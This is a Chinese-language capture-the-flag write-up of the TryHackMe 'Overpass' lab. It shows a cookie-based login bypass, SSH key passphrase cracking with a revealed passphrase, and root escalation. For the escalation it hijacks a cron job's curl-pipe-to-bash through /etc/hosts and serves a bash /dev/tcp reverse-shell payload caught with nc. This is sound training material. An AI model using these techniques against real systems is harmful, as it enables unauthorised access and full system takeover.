---
title: "Tryhackme-Overpass"
date: "2024-02-01"
description: "@[TOC]"
---

@\[TOC\]

_**Tryhackme-Overpass-wp**_

> hello 大家今天是一波 thm的overpass靶场的wp

# [](#主机信息探测 "主机信息探测")主机信息探测

![](https://img2.imgtp.com/2024/02/01/MQwmwDJP.jpg)

> 从80端口找web漏洞或者ssh爆破,但是ssh爆破难度太大,先看web

# [](#web枚举 "web枚举")web枚举

![](https://img2.imgtp.com/2024/02/01/3TYWDkvN.jpg)

> 找到admin目录 可能有身份验证损坏让我们登陆到后台  
> 之后根据提示不用暴力破解 则看到了login.js

# [](#身份验证cookie更改 "身份验证cookie更改")身份验证cookie更改

> login.js

```javascript
async function login() {    const usernameBox = document.querySelector("#username");    const passwordBox = document.querySelector("#password");    const loginStatus = document.querySelector("#loginStatus");    loginStatus.textContent = ""    const creds = { username: usernameBox.value, password: passwordBox.value }    const response = await postData("/api/login", creds)    const statusOrCookie = await response.text()    if (statusOrCookie === "Incorrect credentials") {        loginStatus.textContent = "Incorrect Credentials"        passwordBox.value=""    } else {        Cookies.set("SessionToken",statusOrCookie)        window.location = "/admin"
```

> 两种方法绕过:  
> **方法一:** 代码审计发现如果登录返回不是Incorrect credentials则设置cookie  
> 我们可以控制bp 抓登陆的响应包将包的Incorrect credentials修改并且设置302响应>头loaction:/admin  
> **方法二:** 直接在控制台修改document.cookie=”SessionToken”

# [](#ssh连接 "ssh连接")ssh连接

> 在/admin找到ssh私钥,将私钥保存位rsa,但是要找到私钥的密码可以利用ssh2john 和john破解密码  
> 最后找到私钥密码james13  
> 直接利用ssh登陆  
> ![](https://img2.imgtp.com/2024/02/01/NctBPrVj.jpg)  
> 获取user的flag

# [](#权限提升 "权限提升")权限提升

> 可以看到todo.txt有提示在/etc/crontab中发现有root 权限的脚本  
> root curl overpass.thm/downloads/src/buildscript.sh | bash  
> 并且/etc/hosts我们可以修改此时就想到我们可以 利用root的cronjob来进行一个反弹shell

## [](#思路 "思路")思路

> 将/etc/hosts的 overpass.thm 对应的ip修改为本机的ip  
> 本机开http服务 python -m http.server 80  
> **Ps:**  
> 注意本机的网站目录必须是downloads/src/buildscript.sh  
> 并且buildscript.sh 应该修改为bash -i >& /dev/tcp/本机ip/本机端口 0>&!  
> 最后在本机中开启nc -lvp 本机端口开启监听等几秒就会有root的shell连接

# [](#总结 "总结")总结

> overpass1 还是比较简单的主要还是要掌握一些基本的提权方法以及web登陆的相关机制的知识
